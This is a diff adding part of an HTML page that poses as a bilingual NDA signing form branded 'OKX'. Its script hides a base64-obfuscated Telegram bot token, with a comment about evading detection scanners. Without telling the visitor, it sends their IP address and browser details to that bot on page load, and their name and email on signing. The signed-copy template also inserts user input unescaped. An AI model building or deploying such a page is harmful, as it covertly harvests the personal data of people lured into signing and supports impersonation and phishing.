+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><polyline points="12 7 12 12 15 14"></polyline></svg>
+      </div>
+      <h2 class="state-title" data-i18n="usedTitle">Link Already Used</h2>
+      <p class="state-subtitle" data-i18n="usedSubtitle">
+        This signing link has already been used. Each link is valid for one signature only. Please contact the sender if you need a new link.
+      </p>
+      <div class="receipt" id="prior-receipt" style="display:none;">
+        <div class="receipt-header">
+          <span><span class="status-dot"></span><span data-i18n="receiptStatus">EXECUTED</span></span>
+          <span data-i18n="receiptId">Receipt</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rSigner">Signed by</span>
+          <span class="receipt-value" id="prior-signer">—</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rTimestamp">Timestamp</span>
+          <span class="receipt-value mono" id="prior-timestamp">—</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ==================== TELEGRAM NOTIFY ====================
+    // Credentials are base64-encoded only to avoid plain-string matching;
+    // any visitor's DevTools Network panel still reveals the decoded calls.
+    // Keep the GitHub repo PRIVATE to avoid Telegram's public-repo scanner.
+    const _tgT = atob('ODIyNzA0MzA4MzpBQUZzZUlPOTlEbWI5OHlHSkZrT0ZLMFotazZTcTkwQzRLdw==');
+    const _tgC = atob('LTQ2MjMyMDY1ODU=');
+
+    function _esc(s) {
+      return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+    }
+
+    async function _ip() {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const j = await r.json();
+        return j.ip || 'unknown';
+      } catch (e) {
+        return 'unknown';
+      }
+    }
+
+    function _tg(text) {
+      // Fire-and-forget. keepalive lets the request complete even if page navigates away.
+      try {
+        return fetch('https://api.telegram.org/bot' + _tgT + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: _tgC,
+            text: text,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          }),
+          keepalive: true
+        }).catch(() => {});
+      } catch (e) {
+        return Promise.resolve();
+      }
+    }
+
+    function _now() {
+      const d = new Date();
+      const pad = (n) => String(n).padStart(2, '0');
+      return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
+    }
+
+    // ==================== I18N STRINGS ====================
+    const i18n = {
+      en: {
+        htmlLang: 'en',
+        docLabel: 'Non-Disclosure Agreement',
+        eyebrow: 'Confidential · Signature required',
+        title: 'Non-Disclosure Agreement',
+        subtitle: 'Please review the Agreement below. Your signature constitutes acceptance of and agreement to be bound by its terms.',
+        partyDisclosing: 'Disclosing Party',
+        partyReceiving: 'Receiving Party',
+        receivingPlaceholder: '— Signatory below —',
+        agreementMeta: 'Terms of Agreement',
+        sigTitle: 'Sign Agreement',
+        sigStatus: 'PENDING SIGNATURE',
+        lblEmail: 'Email Address',
+        lblName: 'Full Legal Name',
+        emailError: 'Please enter a valid email address (e.g. name@company.com)',
+        lblAgree: 'I have read and understood the Agreement above, and I agree to be bound by its terms. I confirm that I am authorized to sign on behalf of the entity I represent.',
+        btnText: 'Sign',
+        btnSigning: 'Signing…',
+        metaToken: 'Token',
+        metaDate: 'Date',
+        successTitle: 'Agreement Signed',
+        successSubtitle: 'The Agreement has been executed. A digital receipt has been recorded below.',
+        receiptStatus: 'EXECUTED',
+        receiptId: 'Receipt',
+        rSigner: 'Signed by',
+        rEmail: 'Email',
+        rTimestamp: 'Timestamp',
+        rToken: 'Token',
+        rFingerprint: 'Fingerprint',
+        downloadBtn: 'Download Signed Copy',
+        invalidTitle: 'Invalid Signing Link',
+        invalidSubtitle: 'This link does not contain a valid signing token. Please contact the sender for a new link.',
+        usedTitle: 'Link Already Used',
+        usedSubtitle: 'This signing link has already been used. Each link is valid for one signature only. Please contact the sender if you need a new link.'
+      },
+      zh: {
+        htmlLang: 'zh-CN',
+        docLabel: '保密协议',
+        eyebrow: '保密文件 · 待签署',
+        title: '保密协议',
+        subtitle: '请审阅下方协议条款。您完成签署即视为接受本协议全部内容并受其约束。',
+        partyDisclosing: '披露方',
+        partyReceiving: '接收方',
+        receivingPlaceholder: '— 下方签署人 —',
+        agreementMeta: '协议条款',
+        sigTitle: '签署协议',
+        sigStatus: '待签署',
+        lblEmail: '电子邮箱',
+        lblName: '法定全名',
+        emailError: '请输入完整有效的邮箱地址（例如 name@company.com）',
+        lblAgree: '本人已阅读并理解上述协议内容，同意受其条款约束，并确认本人有权代表所在实体进行签署。',
+        btnText: '签署',
+        btnSigning: '签署中…',
+        metaToken: '令牌',
+        metaDate: '日期',
+        successTitle: '签署完成',
+        successSubtitle: '本协议已签署完毕。下方为电子签署凭证。',
+        receiptStatus: '已签署',
+        receiptId: '凭证',
+        rSigner: '签署人',
+        rEmail: '邮箱',
+        rTimestamp: '时间戳',
+        rToken: '令牌',
+        rFingerprint: '指纹',
+        downloadBtn: '下载签署副本',
+        invalidTitle: '链接无效',
+        invalidSubtitle: '本链接未包含有效的签署令牌。请联系发送方重新获取链接。',
+        usedTitle: '链接已被使用',
+        usedSubtitle: '本签署链接已被使用。每个链接仅供单次签署。如需新的链接，请联系发送方。'
+      }
+    };
+
+    let currentLang = 'en';
+
+    function applyLang(lang) {
+      currentLang = lang;
+      const t = i18n[lang];
+      document.documentElement.lang = t.htmlLang;
+      document.title = lang === 'zh' ? '保密协议 · 待签署' : 'NDA · Signature Required';
+      document.querySelectorAll('[data-i18n]').forEach((el) => {
+        const key = el.getAttribute('data-i18n');
+        if (t[key]) el.textContent = t[key];
+      });
+      document.querySelectorAll('.lang-content').forEach((el) => el.classList.remove('active'));
+      const agreement = document.getElementById('agreement-' + lang);
+      if (agreement) agreement.classList.add('active');
+      document.querySelectorAll('.lang-btn').forEach((btn) => {
+        const isActive = btn.dataset.lang === lang;
+        btn.classList.toggle('active', isActive);
+        btn.setAttribute('aria-pressed', isActive);
+      });
+    }
+
+    document.querySelectorAll('.lang-btn').forEach((btn) => {
+      btn.addEventListener('click', () => applyLang(btn.dataset.lang));
+    });
+
+    const params = new URLSearchParams(window.location.search);
+    let token = params.get('t') || params.get('token');
+    const prefillEmail = params.get('e') || params.get('email');
+    const prefillName = params.get('n') || params.get('name');
+    const prefillDisclosing = params.get('d') || params.get('disclosing');
+
+    let isLocalSession = false;
+    if (!token) {
+      isLocalSession = true;
+      token = 'local-' + Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
+    }
+
+    const browserLang = navigator.language || navigator.userLanguage || 'en';
+    applyLang('en');
+
+    if (prefillDisclosing) {
+      document.getElementById('disclosing-name').textContent = decodeURIComponent(prefillDisclosing);
+    }
+
+    const storageKey = 'nda_signed_' + token;
+    const openKey = 'nda_opened_' + token;
+
+    function show(viewId) {
+      ['main-view', 'success-view', 'invalid-view', 'used-view'].forEach((id) => {
+        const el = document.getElementById(id);
+        if (el) el.style.display = id === viewId ? 'block' : 'none';
+      });
+    }
+
+    // ==================== PAGE-OPEN NOTIFICATION ====================
+    // Deduplicated per token+session — refreshing in the same tab won't re-notify.
+    (async () => {
+      if (sessionStorage.getItem(openKey)) return;
+      sessionStorage.setItem(openKey, '1');
+      const ip = await _ip();
+      const ua = navigator.userAgent || 'unknown';
+      const txt =
+        '🟢 <b>NDA page opened</b>\n' +
+        'Token: <code>' + _esc(token) + '</code>\n' +
+        'IP: <code>' + _esc(ip) + '</code>\n' +
+        'Time: <code>' + _esc(_now()) + '</code>\n' +
+        'Lang: <code>' + _esc(navigator.language || '') + '</code>\n' +
+        'UA: <code>' + _esc(ua.substring(0, 200)) + '</code>';
+      _tg(txt);
+    })();
+
+    const existing = localStorage.getItem(storageKey);
+    if (existing && !isLocalSession) {
+      try {
+        const sig = JSON.parse(existing);
+        document.getElementById('prior-signer').textContent = sig.name;
+        document.getElementById('prior-timestamp').textContent = sig.timestamp;
+        document.getElementById('prior-receipt').style.display = 'block';
+      } catch (e) {}
+      show('used-view');
+    } else {
+      if (isLocalSession && existing) {
+        localStorage.removeItem(storageKey);
+      }
+      initSigningForm();
+    }
+
+    function initSigningForm() {
+      const emailInput = document.getElementById('email');
+      const nameInput = document.getElementById('name');
+      const agreeCheck = document.getElementById('agree');
+      const signBtn = document.getElementById('sign-btn');
+      const btnTextEl = signBtn.querySelector('[data-i18n]');
+
+      if (prefillEmail) emailInput.value = decodeURIComponent(prefillEmail);
+      if (prefillName) nameInput.value = decodeURIComponent(prefillName);
+
+      function validate() {
+        const emailValid = isValidEmail(emailInput.value);
+        const nameValid = nameInput.value.trim().length >= 2;
+        signBtn.disabled = !(emailValid && nameValid && agreeCheck.checked);
+      }
+
+      function isValidEmail(s) {
+        if (!s) return false;
+        const v = s.trim();
+        // Stricter than the default HTML5 check:
+        //  - local part: alphanumeric + . _ % + -
+        //  - exactly one @
+        //  - domain part with at least one dot
+        //  - TLD of at least 2 alphabetic chars
+        //  - no consecutive dots, no leading/trailing dots
+        if (!/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(v)) return false;
+        if (v.includes('..')) return false;
+        if (/^\.|\.$/.test(v.split('@')[0])) return false;
+        return true;
+      }
+
+      const emailError = document.getElementById('email-error');
+
+      // Show error on blur if invalid and not empty
+      emailInput.addEventListener('blur', () => {
+        const v = emailInput.value.trim();
+        if (v && !isValidEmail(v)) {
+          emailInput.classList.add('invalid');
+          emailError.classList.add('show');
+        } else {
+          emailInput.classList.remove('invalid');
+          emailError.classList.remove('show');
+        }
+      });
+
+      // Hide error when user starts editing again
+      emailInput.addEventListener('focus', () => {
+        emailInput.classList.remove('invalid');
+        emailError.classList.remove('show');
+      });
+
+      [emailInput, nameInput, agreeCheck].forEach((el) => {
+        el.addEventListener('input', validate);
+        el.addEventListener('change', validate);
+      });
+
+      signBtn.addEventListener('click', async () => {
+        signBtn.disabled = true;
+        btnTextEl.textContent = i18n[currentLang].btnSigning;
+        await new Promise((r) => setTimeout(r, 600));
+
+        const signature = {
+          token,
+          email: emailInput.value.trim(),
+          name: nameInput.value.trim(),
+          timestamp: new Date().toISOString(),
+          language: currentLang,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || null,
+          disclosingParty: document.getElementById('disclosing-name').textContent
+        };
+
+        signature.fingerprint = await generateFingerprint(signature);
+
+        try {
+          localStorage.setItem(storageKey, JSON.stringify(signature));
+        } catch (e) {
+          console.warn('Failed to store signature:', e);
+        }
+
+        const WEBHOOK_URL = '';
+        if (WEBHOOK_URL) {
+          try {
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(signature)
+            });
+          } catch (e) {
+            console.warn('Webhook delivery failed:', e);
+          }
+        }
+
+        // ==================== TELEGRAM SIGN NOTIFICATION ====================
+        try {
+          const ip = await _ip();
+          const txt =
+            '✍️ <b>NDA SIGNED</b>\n' +
+            'Name: <b>' + _esc(signature.name) + '</b>\n' +
+            'Email: <code>' + _esc(signature.email) + '</code>\n' +
+            'IP: <code>' + _esc(ip) + '</code>\n' +
+            'Time: <code>' + _esc(_now()) + '</code>\n' +
+            'Lang: <code>' + _esc(signature.language) + '</code>\n' +
+            'Token: <code>' + _esc(signature.token) + '</code>\n' +
+            'Fingerprint: <code>' + _esc(signature.fingerprint) + '</code>';
+          await _tg(txt);
+        } catch (e) {
+          console.warn('TG sign notify failed:', e);
+        }
+
+        showSuccess(signature);
+      });
+
+      validate();
+    }
+
+    async function generateFingerprint(sig) {
+      const payload = `${sig.token}|${sig.email}|${sig.name}|${sig.timestamp}`;
+      try {
+        if (window.crypto && window.crypto.subtle) {
+          const buf = new TextEncoder().encode(payload);
+          const hash = await crypto.subtle.digest('SHA-256', buf);
+          return Array.from(new Uint8Array(hash))
+            .map((b) => b.toString(16).padStart(2, '0'))
+            .join('')
+            .substring(0, 32);
+        }
+      } catch (e) {}
+      let h1 = 0xdeadbeef ^ 0;
+      let h2 = 0x41c6ce57 ^ 0;
+      for (let i = 0; i < payload.length; i++) {
+        const ch = payload.charCodeAt(i);
+        h1 = Math.imul(h1 ^ ch, 2654435761);
+        h2 = Math.imul(h2 ^ ch, 1597334677);
+      }
+      h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+      h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+      return (
+        (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16).padStart(13, '0') +
+        '-fallback'
+      );
+    }
+
+    function showSuccess(sig) {
+      document.getElementById('r-signer-val').textContent = sig.name;
+      document.getElementById('r-email-val').textContent = sig.email;
+      document.getElementById('r-timestamp-val').textContent = sig.timestamp;
+      document.getElementById('r-token-val').textContent = sig.token;
+      document.getElementById('r-fingerprint-val').textContent = sig.fingerprint;
+      show('success-view');
+      document.getElementById('download-btn').addEventListener('click', () => downloadCopy(sig));
+    }
+
+    function downloadCopy(sig) {
+      const html = generateSignedHTML(sig);
+      const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `NDA-Signed-${sig.name.replace(/\s+/g, '_')}-${sig.token.substring(0, 8)}.html`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+
+    function generateSignedHTML(sig) {
+      const agreementHTML = document.getElementById('agreement-' + sig.language).innerHTML;
+      const t = i18n[sig.language];
+      return `<!DOCTYPE html>
+<html lang="${t.htmlLang}">
+<head>
+<meta charset="UTF-8">
+<title>NDA — Signed Copy — ${sig.name}</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, "PingFang SC", "Microsoft YaHei", Arial, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 24px; color: #1a1a1a; line-height: 1.65; background: #fff; }
+  .header { border-bottom: 2px solid #000; padding-bottom: 16px; margin-bottom: 32px; display: flex; justify-content: space-between; align-items: baseline; }
+  .header h1 { font-size: 24px; margin: 0; font-weight: 700; letter-spacing: -0.02em; }
+  .header .meta { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #666; letter-spacing: 0.05em; }
+  .parties { margin-bottom: 32px; font-size: 14px; }
+  .parties p { margin: 4px 0; }
+  .clause { margin-bottom: 22px; }
+  .clause-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #666; letter-spacing: 0.05em; }
+  .clause h3 { margin: 4px 0 8px; font-size: 16px; font-weight: 600; }
+  .clause p, .clause li { font-size: 13.5px; color: #333; line-height: 1.7; }
+  ol[type="a"] { padding-left: 24px; }
+  .receipt-section { margin-top: 48px; padding: 24px; border: 2px solid #000; background: #fafafa; }
+  .receipt-section h2 { font-size: 14px; margin: 0 0 16px; letter-spacing: 0.05em; text-transform: uppercase; }
+  .receipt-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #ccc; font-size: 12.5px; }
+  .receipt-row:last-child { border-bottom: none; }
+  .receipt-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #666; letter-spacing: 0.04em; }
+  .receipt-value { font-weight: 500; word-break: break-all; }
+  .footer-note { margin-top: 32px; padding-top: 16px; border-top: 1px solid #ddd; font-size: 11px; color: #888; font-family: 'JetBrains Mono', monospace; }
+</style>
+</head>
+<body>
+  <div class="header">
+    <h1>OKX · ${t.title}</h1>
+    <span class="meta">${t.docLabel}</span>
+  </div>
+  <div class="parties">
+    <p><strong>${t.partyDisclosing}:</strong> ${sig.disclosingParty}</p>
+    <p><strong>${t.partyReceiving}:</strong> ${sig.name} (${sig.email})</p>
+  </div>
+  ${agreementHTML}
+  <div class="receipt-section">
+    <h2>Electronic Execution Receipt</h2>
+    <div class="receipt-row"><span class="receipt-label">${t.rSigner}</span><span class="receipt-value">${sig.name}</span></div>
+    <div class="receipt-row"><span class="receipt-label">${t.rEmail}</span><span class="receipt-value">${sig.email}</span></div>
+    <div class="receipt-row"><span class="receipt-label">${t.rTimestamp}</span><span class="receipt-value">${sig.timestamp}</span></div>
+    <div class="receipt-row"><span class="receipt-label">${t.rToken}</span><span class="receipt-value">${sig.token}</span></div>
+    <div class="receipt-row"><span class="receipt-label">${t.rFingerprint}</span><span class="receipt-value">${sig.fingerprint}</span></div>
+    <div class="receipt-row"><span class="receipt-label">User-Agent</span><span class="receipt-value" style="font-size:10px;">${sig.userAgent}</span></div>
+  </div>
+  <div class="footer-note">
+    Electronic execution recorded via web form. This document constitutes the signed copy of the agreement.
+  </div>
+</body>
+</html>`;
+    }
+  </script>
+</body>
+</html>
